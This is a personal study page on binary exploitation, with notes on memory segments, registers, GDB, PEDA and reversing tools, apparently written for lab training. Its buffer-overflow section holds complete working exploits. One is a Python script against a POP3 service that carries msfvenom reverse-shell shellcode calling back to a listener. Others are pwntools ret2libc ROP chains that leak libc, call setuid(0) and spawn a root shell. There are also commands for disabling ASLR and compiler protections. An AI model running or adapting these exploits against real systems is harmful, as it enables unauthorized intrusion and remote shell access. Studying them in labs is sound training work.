---
layout: page
title: Binary
permalink: /binary/
---

# Index

* [Theory](#theory)
* [Assembly](#assembly)
* [Buffer Overflows](#buffer-overflows)
* [Reversing](#reversing)

## Theory

### Memory Segments

![Memory Segments]({{ site.url }}/assets/segments.JPG)


>In C, as in other compiled languages, the compiled code goes into the text segment, while the variables reside in the remaining segments. Exactly which memory segment a variable will be stored in depends on how the variable is
defined. Variables that are defined outside of any functions are considered to be global. The static keyword can also be prepended to any variable declaration to make the variable static. If static or global variables are initialized with data, they are stored in the data memory segment; otherwise, these variables are put in the bss memory segment. Memory on the heap memory segment must first be allocated using a memory allocation function called malloc(). Usually, pointers are used to reference memory on the heap. Finally, the remaining function variables are stored in the stack memory segment. Since the stack can contain many different stack frames, stack variables can maintain uniqueness within different functional contexts.

`From 'Hacking: The Art of Exploitation'`

### Registers

`x86`

The first four registers (EAX, ECX, EDX, and EBX) are known as generalpurpose
registers. These are called the Accumulator, Counter, Data, and Base
registers, respectively. They are used for a variety of purposes, but they mainly
act as temporary variables for the CPU when it is executing machine
instructions.

The second four registers (ESP, EBP, ESI, and EDI) are also generalpurpose
registers, but they are sometimes known as pointers and indexes.
These stand for Stack Pointer, Base Pointer, Source Index, and Destination Index,
respectively. The first two registers are called pointers because they store 32-bit
addresses, which essentially point to that location in memory.

The EIP register is the Instruction Pointer register, which points to the
current instruction the processor is reading. Like a child pointing his finger
at each word as he reads, the processor reads each instruction using the EIP
register as its finger.

The remaining EFLAGS register actually consists of several bit flags that
are used for comparisons and memory segmentations.

`x64`

![Registers]({{ site.url }}/assets/register.jgp)

1. The 64-bit registers have names beginning with “R” (on 32 bit they begin with “E”)
2. There are general purpose and special purpose regisyers
3. on an X64 platform, memory addresses are 64 bit long,  but addresses greater than 0x0000fffffffffff (48 bits) will often raise exceptions in userspace.

Imagine a 64-bit linear address space where the middle doesn’t exist – you’d have a usable area (of canonical addresses) from 0x0000000000000000 to 0x00007FFFFFFFFFFF, an unusable area (of non-canonical addresses) from 0x0000800000000000 to 0xFFFF7FFFFFFFFFFF, and another usable area (of canonical addresses) from 0xFFFF800000000000 to 0xFFFFFFFFFFFFFFFF.

## Assembly

### GDB

`gcc -g program.c -o program` compile code with flags for gdb to provide extra info

`gdb -q program` open gdb in quiet mode (no banner)

`(gdb) list` print source code

`(gdb) break main` set a breakpoint

`(gdb) run` run from start till breakpoint or end

`(gdb) info register rip` print current value of a register

`(gdb) x` allows us to examine the value of a memory address

`(gdb) x\x $rip` examine\in hex value at rip 

`(gdb) x\u 0x8048434` exadmine\in unsigned decimal value at 0x8048434

`(gdb) x\2x $rip` examine 2 units at rip

`(gdb) x\12x 0x8048384` examine 12 units

The default size of a single unit is a four-byte unit called a word.

The valid size letters are as follows:
* b A single byte
* h A halfword, which is two bytes in size
* w A word, which is four bytes in size
* g A giant, which is eight bytes in size

For example

`(gdb) x/8xb` examine 8 bytes in hex

On the x86 processor values are stored in little-endian
byte order, which means the least significant byte is stored first. For example,
if four bytes are to be interpreted as a single value, the bytes must be used
in reverse order.

`(gdb) i` investigate = show address

`(gdb) x` examine = show actualy value

`(gdb) x/i $eip` examine the next instruction at $eip

`(gdb) x/3i $eip` examine the next three instructions

`(gdb) nexti` read EIP, execute it and advance EIP to the next instruction

`(gdb) x/6cb 0x8048484` read 6 bytes as ASCII chars

`(gdb) x/s 0x8048484` read as an ASCII string

`(gdb) cont` continue from a breakpoint

`(gdb) bt` backtrace, show the stack

`(gdb) x/200xg $rsp-500` get the 200g 500 back from the $rsp. Used to find nop sled for instance.

`(gdb) p &a` if you need the address of variable a

### PEDA

PEDA - Python Exploit Development Assistance for GDB extends and modernises GDB.

https://github.com/longld/peda

`pattern_create 500 buffer.txt` will create a non-repeating string to help determine the exact memory addresses of buffer overlows

###Checkec

https://github.com/slimm609/checksec.sh

Use checsec.sh to see what binary protections a file was compiled with (canaries, etc)

---

## Buffer Overflows

### Basic Windows x86 Buffer Overflow

Tools: Immunity Debugger, Python, Metasploit

> Our aim: Overwrite the EIP/RIP register with the address of our shellcode

Important Registers:
1. EPB/RPB: register which points to base of the current the stack frame
2. ESP/RSP: register which points to the top of the current stack frame
3. EIP/RIP:  register which points to the next processor instruction

#### Use a script to reproduce the crash

```
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer= 'A'* 2700

try:
  print "\nSending evil buffer..."
  s.connect(('10.0.0.22',110))
  data = s.recv(1024)
  s.send('USER username' +'\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!."

except:
  print "Could not connect to POP3!"
```

#### Identify the offsets

```
msf-pattern_create -l 2700
```

```
msf-pattern_offset -l 2700 -q 39694438
```

#### Identify bad characters

Place badchars on the stack and see what gets truncated/doesn't print.
Run multiple times removing first error each time until all badchars are discovered.
```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

````

#### Find an address with a useable JMP ESP

Use msf to find the hex for JMP ESP
```
msf-nasm_shell
nasm > jmp esp
00000000 FFE4 jmp esp
```
Use mona in immunity debugger to find modules we can use
```
!mona modules
```
Use mona to find instances of JMP ESP
```
!mona find -s "\xff\xe4"

Useful parameters:
-cm os=false                 #don't look in OS dlls
-cpb="bad chars in hex"      #don't include addresses with these chars
```
*Make sure the address selected doesn't have any bad chars*

*Try to find one in the original executable if possible for portability*

*Make sure to check the security on the module we are using the address from*

#### Generate shellcode

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.198 LPORT=1337 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

#### Pad with NOPs

Add a variable amount of NOPs to the start of the shellcode.
```
"\x90" * 8
```

#### Exploit

```
import socket 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

#badchar x00,x0A,x0D 

buf =  "" 
buf += "\xba\x03\x1f\x13\xe6\xd9\xed\xd9\x74\x24\xf4\x58\x33" 
buf += "\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e\x03\x53\x11\xf1" 
buf += "\x13\xaf\xc5\x77\xdb\x4f\x16\x18\x55\xaa\x27\x18\x01" 
buf += "\xbf\x18\xa8\x41\xed\x94\x43\x07\x05\x2e\x21\x80\x2a" 
buf += "\x87\x8c\xf6\x05\x18\xbc\xcb\x04\x9a\xbf\x1f\xe6\xa3" 
buf += "\x0f\x52\xe7\xe4\x72\x9f\xb5\xbd\xf9\x32\x29\xc9\xb4" 
buf += "\x8e\xc2\x81\x59\x97\x37\x51\x5b\xb6\xe6\xe9\x02\x18" 
buf += "\x09\x3d\x3f\x11\x11\x22\x7a\xeb\xaa\x90\xf0\xea\x7a" 
buf += "\xe9\xf9\x41\x43\xc5\x0b\x9b\x84\xe2\xf3\xee\xfc\x10" 
buf += "\x89\xe8\x3b\x6a\x55\x7c\xdf\xcc\x1e\x26\x3b\xec\xf3" 
buf += "\xb1\xc8\xe2\xb8\xb6\x96\xe6\x3f\x1a\xad\x13\xcb\x9d" 
buf += "\x61\x92\x8f\xb9\xa5\xfe\x54\xa3\xfc\x5a\x3a\xdc\x1e" 
buf += "\x05\xe3\x78\x55\xa8\xf0\xf0\x34\xa5\x35\x39\xc6\x35" 
buf += "\x52\x4a\xb5\x07\xfd\xe0\x51\x24\x76\x2f\xa6\x4b\xad" 
buf += "\x97\x38\xb2\x4e\xe8\x11\x71\x1a\xb8\x09\x50\x23\x53" 
buf += "\xc9\x5d\xf6\xf4\x99\xf1\xa9\xb4\x49\xb2\x19\x5d\x83" 
buf += "\x3d\x45\x7d\xac\x97\xee\x14\x57\x70\x1b\xe2\x57\x46" 
buf += "\x73\xf6\x57\x43\xbd\x7f\xb1\x21\xad\x29\x6a\xde\x54" 
buf += "\x70\xe0\x7f\x98\xae\x8d\x40\x12\x5d\x72\x0e\xd3\x28" 
buf += "\x60\xe7\x13\x67\xda\xae\x2c\x5d\x72\x2c\xbe\x3a\x82" 
buf += "\x3b\xa3\x94\xd5\x6c\x15\xed\xb3\x80\x0c\x47\xa1\x58" 
buf += "\xc8\xa0\x61\x87\x29\x2e\x68\x4a\x15\x14\x7a\x92\x96" 
buf += "\x10\x2e\x4a\xc1\xce\x98\x2c\xbb\xa0\x72\xe7\x10\x6b" 
buf += "\x12\x7e\x5b\xac\x64\x7f\xb6\x5a\x88\xce\x6f\x1b\xb7" 
buf += "\xff\xe7\xab\xc0\x1d\x98\x54\x1b\xa6\xb8\xb6\x89\xd3" 
buf += "\x50\x6f\x58\x5e\x3d\x90\xb7\x9d\x38\x13\x3d\x5e\xbf" 
buf += "\x0b\x34\x5b\xfb\x8b\xa5\x11\x94\x79\xc9\x86\x95\xab" 

buffer = 'A' * 2606 + "\x63\x79\x4b\x5f" + "\x90" * 8 + buf 

try: 
    print "\nSending buffer" 
    s.connect(('10.11.26.104', 110)) 
    data = s.recv(1024) 
    s.send('USER username' + '\r\n') 
    data = s.recv(1024) 
    s.send('PASS ' + buffer + '\r\n') 
    print "\nDone" 

except: 
    print "Could not connect" 
```

### Linux Buffer Overflows

#### 1. Confirm architecture and check protections

```
rabin2 -I <binary>
checksec <binary> (checksec is available with pwntools and peda)
```
RELRO: Relocation Read Only
Stack: stack canary
NX: no-execute bit, code on the stack won't be executed, likely need to perform a ROP chain
PIE: Position independant code

#### 2. Determine overflow offset

```
gdb-peda$ pattern create 200
gdb-peda$ r OR c as required
paste in pattern
gdb-peda$ pattern search
```

#### 3. Gather information necessary to perform exploit

```
Check function names

$ rabin2 -i <binary>

Check user created function names

$ rabin2 -qs <binary> | grep -ve imp -e ' 0 ' 

Find strings

$ rabin2 -z <binary>
```

### Advinced Linux x64 ret2libc ropchain Buffer Overflow

In 64 bit architecture, the rsp (register stack pointer) and rbp (register base pointer) registers are the focus.

The program remembers its place in the stack with the rsp register. The rsp register will move up or down when things are pushed and popped from the stack. The rbp register store the bottom of the stacck.

Unlike in x86, where arguments are passed as the next line on the stack, arguments are passed in registers in 64-bit programs. This means we will need to find a way to control the RDI register.

```
The MOVAPS issue
If you're using Ubuntu 18.04 and segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the 64 bit challenges then ensure the stack is 16 byte aligned before returning to GLIBC functions such as printf() and system().
Try padding your ROP chain with an extra ret before returning into a function.
```

#### Update notes on GOT AND PLT, maybe calling conventions

#### Determine security features 

```
gdb vulnerable
gdb-peda$ checksec

CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

#### Determine the Offsets

```
gdb-peda$ pattern create 300
gdb-peda$ r
*put pattern in overflow input*
gdb-peda$ x/xg $rsp or gdb-peda$ pattern search
0x7ffe8d904528: 0x41416d4141514141
gdb-peda$ pattern offset 0x41416d4141514141
4702159612987654465 found at offset: 136
```

#### Write a script to reproduce crash

We will use pwntools for interacting with the process, but for the purposes of these notes will not use the modules that automate much of this process.

```
from pwn import *

context.binary = './vulnerable'
p = process('./vulnerable', stdin=PTY)       #MAY NEED TO CHANGE STDIN/OUT args
context(terminal=['tmux','new-window'])
#context.log_level = 'DEBUG'    #Prints debugging messages
#p = gdb.debug('./ret2win32')   #Allows us to interact with GDB running the process. Fpr GDB to catch SEGFAULT need the script to continue afterwards, i.e. add a raw_input()

payload = "A" * 300

print p.recvuntil(":")
p.sendline(payload)
print p.recvuntil(".")
raw_input()          # so our script continues after the process crashes so we can see SEGFAULT
```

#### Find location of libc puts in vulnerable program

```
objdump -D garbage | grep puts
0000000000401050 <puts@plt>:
  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
```

#### Find location of pop rdi gadget

```
# ROPgadget --binary garbage | grep "pop rdi" 
```

#### Update script to leak location of libc

```
from pwn import *

context.binary = './vulnerable'
p = process('./vulnerable', stdin=PTY)

plt_put = 0x401050
got_put = 0x404028
pop_rdi = 0x40179b

payload = "A" * 136 + pop_rdi + got_put + plt_put

print p.recvuntil(":")
p.sendline(payload)
print p.recvuntil(".")
raw_input()          # so our script continues after the process crashes so we can see SEGFAULT
```
#### Return program to main so we can overflow again with known glibc address

```
huwwp@ubuntu:~/binary/garbage$ objdump -D garbage | grep main                      
0000000000401619 <main>: 
```

```
from pwn import *

context.binary = './garbage'
p = process('./garbage', stdin=PTY)
context(terminal=['tmux','new-window'])
context.log_level = 'DEBUG'
#p = gdb.debug('./garbage', stdin=PTY)

offset = "A" * 136

#401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
#0x000000000040179b : pop rdi ; ret
#0000000000401619 <main>:

plt_put = p64(0x401050)
got_put = p64(0x404028)
pop_rdi = p64(0x40179b)
plt_main = p64(0x401619)

payload = pop_rdi + got_put + plt_put + plt_main

print p.recv()
p.sendline(offset + payload)
print p.recvuntil('.\n')
leaked_puts = p.recvline().strip()
print "Leaked puts: " + leaked_puts
print p.recv()
raw_input()
```
#### Construct a ROP Chain to send us a shell and perform overflow again

First find libc
```
$ locate libc.so.6
/home/huwwp/binary/garbage/libc.so.6
```
Find the location of puts in libc so we can calculate the runtine offset between our leaked puts and this one.
```
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
425: 0000000000081010   437 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
```
Find the location of system() in libc
```
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
1417: 0000000000050300    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```
Find the string /bin/sh in libc
```
$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh                                        
 1aae80 /bin/sh
```
Find a ret for padding
```
$ ROPgadget --binary garbage | grep ret
```

#### Update script to perform attack

```
from pwn import *

context.binary = './garbage'
p = process('./garbage', stdin=PTY)
context(terminal=['tmux','new-window'])
#context.log_level = 'DEBUG'
#p = gdb.debug('./garbage', stdin=PTY)

buf = "A" * 136

#401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
#0x000000000040179b : pop rdi ; ret
#0000000000401619 <main>:

plt_put = p64(0x401050)
got_put = p64(0x404028)
pop_rdi = p64(0x40179b)
plt_main = p64(0x401619)

payload = pop_rdi + got_put + plt_put + plt_main

print p.recv()
p.sendline(buf + payload)
print p.recvuntil('.\n')
leaked_puts = p.recvline().strip()
print "Leaked puts: " + leaked_puts
print p.recv()

#425: 0000000000081010   437 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
#1417: 0000000000050300    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
#1aae80 /bin/sh

libc_put = 0x81010
libc_sys = 0x50300
libc_sh = 0x1aae80
ret = 0x401016

offset = u64(leaked_puts.ljust(8,"\x00")) - libc_put
sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)

print "Offset: " + str(offset)

payload2 = pop_rdi + sh + p64(ret) + sys

p.sendline(buf + payload2)
p.recv()
p.interactive()
```
#### Update script to maintain SUID

```
from pwn import *

context.binary = './garbage'
p = process('./garbage', stdin=PTY)
context(terminal=['tmux','new-window'])
#context.log_level = 'DEBUG'
#p = gdb.debug('./garbage', stdin=PTY)

buf = "A" * 136

#401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
#0x000000000040179b : pop rdi ; ret
#0000000000401619 <main>:

plt_put = p64(0x401050)
got_put = p64(0x404028)
pop_rdi = p64(0x40179b)
plt_main = p64(0x401619)

payload = pop_rdi + got_put + plt_put + plt_main

print p.recv()
p.sendline(buf + payload)
print p.recvuntil('.\n')
leaked_puts = p.recvline().strip()
print "Leaked puts: " + leaked_puts
print p.recv()

#425: 0000000000081010   437 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
#1417: 0000000000050300    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
#1aae80 /bin/sh
#25: 00000000000df790   144 FUNC    WEAK   DEFAULT   13 setuid@@GLIBC_2.2.5

libc_put = 0x81010
libc_sys = 0x50300
libc_sh = 0x1aae80
libc_setuid = 0xdf790
ret = 0x401016

offset = u64(leaked_puts.ljust(8,"\x00")) - libc_put
sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)
suid = p64(offset + libc_setuid)

print "Offset: " + str(offset)

#payload2 = pop_rdi + sh + p64(ret) + sys

payload2 = pop_rdi + p64(0) + p64(ret) + suid + pop_rdi + sh + p64(ret) + sys

p.sendline(buf + payload2)
p.recv()
p.interactive()

```

### Disabling OS and Compiler Security

Disable ASLR: `echo 0 > /proc/sys/kernel/randomize_va_space`

Gcc compiler options: `gcc -fno-stack-protector -z execstack`

Gcc flag for x86: `gcc -m32`

### References

http://www.thegreycorner.com/2010/01/beginning-stack-based-buffer-overflow.html

http://insecure.org/stf/smashstack.html

### Great Windows Resources

https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

https://github.com/justinsteven/dostackbufferoverflowgood

---

## Reversing

### Objdump

Disassemble to intel assembly

`objdump -M intel -d <programname>`

Has many more options.

### Strings

Find all strings in a file.

`strings <program>`

### strace

Outputs all system calls a program makes

`strace <program>`

### ltrace

Outputs all library calls a program makes

`ltrace <program>`

### Radare2

R2 is a very powerful and feature rich disassembler, best for static code analysis

Open a file in r2

`r2 <program>`

Analyse all

`aaa`

Go to visual mode 

`v`

Go to graph

`v`

### Immunity Debugger

For working with Windows binaries.

Find strings
```
In the Dissassembler Window (top left) right click > Search for > All Referenced Text Strings
```

### dnSpy

.NET debugger and assembly editor
